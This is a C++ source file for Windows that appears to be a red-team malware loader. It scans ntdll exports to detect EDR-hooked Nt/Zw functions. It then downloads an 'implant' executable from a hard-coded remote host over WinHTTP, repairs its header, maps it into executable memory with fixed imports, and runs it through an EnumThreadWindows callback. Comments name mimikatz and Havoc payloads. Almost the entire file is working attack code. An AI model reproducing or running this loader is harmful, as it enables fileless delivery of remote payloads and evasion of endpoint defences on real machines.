#include <iostream>
#include <Windows.h>
#include <winternl.h>		// For Ntdll parsing
#include <winhttp.h>		// For http Operation
#include <vector>

#pragma comment(lib, "winhttp")
#pragma comment (lib, "user32")			// For EnumThreadWindows()

//#pragma warning (disable: 4996)

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sNt[] = { 'N', 't', 0x0 };
unsigned char sZw[] = { 'Z', 'w', 0x0 };
unsigned char syscallstub[] = { 0x4c, 0x8b, 0xd1, 0xb8 };

// Erradicating False-Positives
unsigned char sNtGetTickCount[] = { 'N','t','G','e','t','T','i','c','k','C','o','u','n','t', 0x0 };

unsigned char sNtQuerySystemTime[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','T','i','m','e', 0x0 };
unsigned char sZwQuerySystemTime[] = { 'Z','w','Q','u','e','r','y','S','y','s','t','e','m','T','i','m','e', 0x0 };

unsigned char sNtdllDefWindowProc_A[] = { 'N','t','d','l','l','D','e','f','W','i','n','d','o','w','P','r','o','c','_','A', 0x0 };
unsigned char sNtdllDefWindowProc_W[] = { 'N','t','d','l','l','D','e','f','W','i','n','d','o','w','P','r','o','c','_','W', 0x0 };

unsigned char sNtdllDialogWndProc_A[] = { 'N','t','d','l','l','D','i','a','l','o','g','W','n','d','P','r','o','c','_','A', 0x0 };
unsigned char sNtdllDialogWndProc_W[] = { 'N','t','d','l','l','D','i','a','l','o','g','W','n','d','P','r','o','c','_','W', 0x0 };

/*
struct structure {

    LPVOID data;
    size_t len;

};
*/

/*
void Load_PE(char* pe, DWORD pe_size)
//void Load_PE()
{
	DATA data;

	printf("[+] Load_PE => pe addr: %p", data.data);
	printf("[+] Load_PE => pe size: %d", data.len);

}
*/

/* 	====================================================================== For HTTP GET Request ============================================================================		*/

#define PAYLOAD_URI "192.168.0.104"
//#define PAYLOAD_URI "https://github.com/reveng007/Executable_Files/raw/main/"

//#define Target_File "win10-ntdll_22H2_19045-2486.dll"
//#define Target_File "mimikatz.exe"

//#define PORT "80"
//#define PORT "443"

#define MAX 100

// From link: https://stackoverflow.com/questions/38672719/post-request-in-winhttp-c
int GET_PE()
//int main()
{
	//structure data;
    std::vector<unsigned char> buffer;

	char str[MAX];
	printf("\n[+] Enter Implant name to Download: ");
	scanf("%[^\n]%*c", str);

	//char* pe = argv[1];
	char* pe = str;

	// Payload URL: const char[] to string
	wchar_t* whost = new wchar_t[sizeof(PAYLOAD_URI)];
	mbstowcs(whost, PAYLOAD_URI, sizeof(PAYLOAD_URI));

	// implant PE: const char[] to string
	const size_t cSize2 = strlen(pe) + 1;
	wchar_t* wpe = new wchar_t[cSize2];
	mbstowcs(wpe, pe, cSize2);

	DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;

    BOOL bResults = FALSE, bResponse = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
    {
    	printf("\nURL: %s\n", (LPCWSTR)PAYLOAD_URI);

        //hConnect = WinHttpConnect(hSession, (LPCWSTR)PAYLOAD_URI, (DWORD)PORT, 0);
        //hConnect = WinHttpConnect(hSession, L"192.168.0.104", INTERNET_DEFAULT_HTTP_PORT, 0);
        
        //hConnect = WinHttpConnect(hSession, whost, (INTERNET_PORT)((int)PORT), 0);
        hConnect = WinHttpConnect(hSession, whost, INTERNET_DEFAULT_PORT, 0);
    }
    else
    {
    	printf("[!] WinHttpConnect Operation Failed: %u \n", GetLastError());
    }

    // Creating an HTTP GET request handle.
    if (hConnect)
    {
    	printf("\nTarget File: %s\n\n", (LPCWSTR)str);

		hRequest = WinHttpOpenRequest(hConnect, L"GET", wpe,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0); //WINHTTP_FLAG_SECURE

    }
    else
    {
    	printf("[!] WinHttpOpenRequest Operation Failed: %u \n", GetLastError());
    }

    // link: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
    // Send a request.
    if (hRequest)
    {
		bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    }
    else
    {
    	printf("[!] WinHttpSendRequest Operation Failed: %u \n", GetLastError());
    }

    // End the request.
    if (bResults)
    {
        bResponse = WinHttpReceiveResponse(hRequest, NULL);
    }
    else
    {
    	printf("[!] WinHttpReceiveResponse Operation Failed: %u \n", GetLastError());
    }

    // Keep checking for data until there is nothing left.
    if (bResponse)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                printf("[!] Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("[!] Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                {
                    printf("[!] Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {
					buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                }
                delete[] pszOutBuffer;

                //printf("[+] Size of pe: %d\n", pszOutBuffer);
            }
        } while (dwSize > 0);
    }

    // Report any errors.
    if (!bResponse)
    {
        printf("[!] Error %d has occurred.\n", GetLastError());
    }
    
    // Close any open handles.
    if (hRequest)
    {
    	printf("[+] Closing Handle1\n");
    	WinHttpCloseHandle(hRequest);
    }
    if (hConnect)
    {
    	printf("[+] Closing Handle2\n");
    	WinHttpCloseHandle(hConnect);
    }
    if (hSession)
    {
    	printf("[+] Closing Handle3\n\n");
    	WinHttpCloseHandle(hSession);
    }

    //memcpy(pe_data, pszOutBuffer, n);

    size_t size = buffer.size();

    char* bufdata = (char*)malloc(size);
    for (int i = 0; i < buffer.size(); i++)
    {
        bufdata[i] = buffer[i];
    }

    //data.data = bufdata;
    //data.len = size;

	//printf("Addr of pe: %p\n", data.data);
	printf("Addr of pe: %p\n", bufdata);
    //printf("Size of PE data => %d\n", data.len);
    printf("Size of PE data => %d\n", size);


    // Updating: 90 to M (1st byte)

    unsigned char update = 'M';

    for (int i = 0; i < buffer.size(); i++)
    {
    	if(i == 0)
    	{
    		printf("1st byte of PE: %c\n", buffer[i]);

    		printf("Updating it to: %c\n", update);
    		bufdata[i] = update;
    	}
    }

    // ==========================================
    // Call Load_PE and then send the pointer to the address and the size of the pe payload

    //Load_PE((char *)data.data, data.len);
	// ==========================================




    /*  ****************************************************************** Loading PE in-memory ***************************************************************************	*/


    // ============== Loading NT Header ====================

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)bufdata;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE)
	{
		//return NULL;
		printf("[!] Unable to get IMAGE_DOS_SIGNATURE: %u\n", GetLastError());
		return 1;
	}
	
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	
	if (pe_offset > kMaxOffset)
	{
		//return NULL;
		printf("[!] Unable to get IMAGE_DOS_HEADER->e_lfanew: %u\n", GetLastError());
		return 1;
	}

	IMAGE_NT_HEADERS32* inth = (IMAGE_NT_HEADERS32*)((char*)bufdata + pe_offset);

	if (inth->Signature != IMAGE_NT_SIGNATURE)
	{
		//return NULL;
		printf("[!] Unable to get IMAGE_NT_HEADERS->Signature: %u\n", GetLastError());
		return 1;
	}

	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((char *)inth);

    if (!ntHeader)
    {
		printf("[!] Unable to get address of IMAGE_NT_HEADERS: %u\n", GetLastError());
		return 1;
    }
    else
    {
    	printf("[+] Successfully was able to retrieve address of IMAGE_NT_HEADERS of in-memory loaded -> %s\n", str);
    }


    
    // ============== Loading PE DATA Directory => For getting the address of the Section Header ====================

    // Checking Between min. and max. number of members within data directories
    size_t min = IMAGE_DIRECTORY_ENTRY_BASERELOC;
    size_t max = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;

    if (min >= max)
    {
    	//return NULL;
    	printf("[!] Minimun number of members within IMAGE_NT_HEADERS->OptionalHeader.DataDirectory can't be greater than maximum number of members: %u\n", GetLastError());
    	return 1;
    }

    IMAGE_DATA_DIRECTORY* peDir1 = NULL;

    peDir1 = &(ntHeader->OptionalHeader.DataDirectory[min]);

    // Checking Whether we got the Virtual address member present within the Section Headers Structure
    if (peDir1->VirtualAddress == NULL)
    {
        //return NULL;
    	printf("[!] Unable to retrieve Legit Virtual Address Member of the Section Headers Structure: %u\n", GetLastError());
    	return 1;
    }


    // ================================== ImageBaseAddr ========================================================

    IMAGE_DATA_DIRECTORY* relocDir = peDir1;
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

    printf("[+] Legit/Preferred Image Base Address of loaded PE (IMAGE_NT_HEADERS->OptionalHeader.ImageBase): %p\n", preferAddr);
    printf("[!] But, BaseAddress of the loaded PE: %p\n", bufdata);

    // ========= Allocating Memory for loading PE image ===========================

    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pImageBase)
    {
        if (!relocDir)
        {
            exit(0);
        }
        else
        {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }

    // =================================== FILL the memory block with PEdata =========================
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy(pImageBase, bufdata, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(bufdata) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }

    printf("\n[*] Performing BaseAddress Relocation to Solve the Problem...\n");

    // Calculating Delta value to perform BaseAddress Relocation

    long long Delta;

    Delta = bufdata - preferAddr;

    printf("[>] Delta Value: %p\n", Delta);

    // =================================== Repairing IAT ===========================================

    printf("[*] Fixing Imports...\n");

    // Checking: 
    min = IMAGE_DIRECTORY_ENTRY_IMPORT;
    max = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;

    if (min >= max)
    {
    	//return NULL;
    	printf("[!] IMAGE_DIRECTORY_ENTRY_IMPORT can't be greater than IMAGE_NUMBEROF_DIRECTORY_ENTRIES: %u\n", GetLastError());
    	return 1;
    }

    IMAGE_DATA_DIRECTORY* peDir2 = NULL;

    peDir2 = &(ntHeader->OptionalHeader.DataDirectory[min]);

    // Checking Whether we got the Virtual address member present within the Section Headers Structure
    if (peDir2->VirtualAddress == NULL)
    {
        //return NULL;
    	printf("[!] Unable to retrieve Legit Member:Virtual Address of the Section Headers Structure: %u\n", GetLastError());
    	return 1;
    }

    IMAGE_DATA_DIRECTORY* importsDir = peDir2;

    if (importsDir == NULL)
    {
    	return false;
    }

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR))
    {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)pImageBase);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)pImageBase + lib_desc->Name);

        // Havoc Exe file doesn't load any dll: IAT = 0
        printf("DLL Name: %s\n", lib_name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL)
        {
        	thunk_addr = lib_desc->FirstThunk;
        }

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(pImageBase) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(pImageBase) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function)
            {

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(pImageBase)+orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;

                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);

				fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }

    // AddressOfEntryPoint
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;

    printf("[*] Running PE via EnumThreadWindows...");

    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);

    return 0;
}


int main()
//int DetectHooks()
{
	HMODULE BaseAddr = GetModuleHandle((LPCSTR) sNtdll);
	//HMODULE BaseAddr = LoadLibrary((LPCSTR) sNtdll);

	// region Start: DOS_HEADER
	IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)BaseAddr;
	// endregion End: DOS_HEADER

	// region Start: NT_HEADERS => Accessing the last member of DOS Header (e_lfanew) to get the entry point for NT Header
	IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)BaseAddr + DOS_HEADER->e_lfanew);
	// endregion Start: NT_HEADERS

	// Let's Jump to the Fun Part!
	printf("\n[*] Jumping to EAT of loaded ntdll in process memory...\n\n");

	// Why 0th element => see this link (image): EAT_ntdll.PNG
	IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)BaseAddr + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

	// see struct: link (image): _IMAGE_EXPORT_DIRECTORY.PNG
	DWORD* addrNames = (DWORD*)((DWORD_PTR)BaseAddr + EXPORT_DIR->AddressOfNames);
	DWORD* addrFunction = (DWORD*)((DWORD_PTR)BaseAddr + EXPORT_DIR->AddressOfFunctions);
	WORD* addrOrdinal = (WORD*)((DWORD_PTR)BaseAddr + EXPORT_DIR->AddressOfNameOrdinals);

	// Checking For Nt and Zw fruntions from EAT of loaded NTDLL in process memory
	
	printf("[+] Retrieved Hooked Function Names: \n\n");

	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
	{
		// Post fix: For picking names
		char* name = (char*)((DWORD64)BaseAddr + *(DWORD*)addrNames++);
		
		// Pre fix: Post fix was picking addr of the next function (ptr/offset to the next function) than the current function that we are actually going to print
		char* addr = (char*)((DWORD64)BaseAddr + *(DWORD*)++addrFunction);
		
		// Only those Which starts with `Nt` and `Zw`
		if (strncmp(name, (char *)sNt, 2) == 0 || strncmp(name, (char *)sZw, 2) == 0)
        {
        	// Neglecting False-Positives
        	if (memcmp(addr, syscallstub, 4) != 0)
        	{
        		if (!(strcmp(name, (char *)sNtGetTickCount) == 0
        			|| strcmp(name, (char *)sNtQuerySystemTime) == 0
        			|| strcmp(name, (char *)sZwQuerySystemTime) == 0
        			|| strcmp(name, (char *)sNtdllDefWindowProc_A) == 0
        			|| strcmp(name, (char *)sNtdllDefWindowProc_W) == 0
        			|| strcmp(name, (char *)sNtdllDialogWndProc_A) == 0
        			|| strcmp(name, (char *)sNtdllDialogWndProc_W) == 0))
        		{
        			printf("\t %s [addr: %p]\n", name, addr);
        		}
        	}
		}
		/*
		// Neglecting False-Positives
    	if (memcmp(addr, syscallstub, 4) != 0)
    	{
    		if (!(strcmp(name, (char *)sNtGetTickCount) == 0
    			|| strcmp(name, (char *)sNtQuerySystemTime) == 0
    			|| strcmp(name, (char *)sZwQuerySystemTime) == 0
    			|| strcmp(name, (char *)sNtdllDefWindowProc_A) == 0
    			|| strcmp(name, (char *)sNtdllDefWindowProc_W) == 0
    			|| strcmp(name, (char *)sNtdllDialogWndProc_A) == 0
    			|| strcmp(name, (char *)sNtdllDialogWndProc_W) == 0))
    		{
    			printf("\t %s [addr: %p]\n", name, addr);
    		}
    	}
    	*/
	}

	printf("Press Enter to Exit Prompt... "); getchar();

	int e = GET_PE();

	return 0;
}

